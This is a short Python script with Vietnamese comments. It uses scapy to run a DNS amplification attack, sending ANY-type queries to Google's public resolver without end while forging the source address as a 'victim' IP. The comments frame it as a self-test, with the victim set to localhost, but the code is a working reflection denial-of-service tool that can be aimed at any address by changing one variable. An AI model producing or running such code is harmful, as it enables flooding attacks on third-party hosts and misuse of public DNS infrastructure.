from scapy.all import IP, UDP, DNS, DNSQR, send
import random

# IP của máy bạn (nạn nhân)
victim_ip = "127.0.0.1" 
# IP của DNS Server để test (Có thể dùng 8.8.8.8 hoặc 1.1.1.1)
dns_server = "8.8.8.8" 

def dns_amplification():
    print("Đang thực hiện khuếch đại DNS... Kiểm tra web của bạn!")
    while True:
        # Giả mạo IP nguồn là nạn nhân
        packet = IP(src=victim_ip, dst=dns_server) / \
                 UDP(sport=random.randint(1024, 65535), dport=53) / \
                 DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255)) # Sửa thành số 255
        send(packet, verbose=False)

dns_amplification()
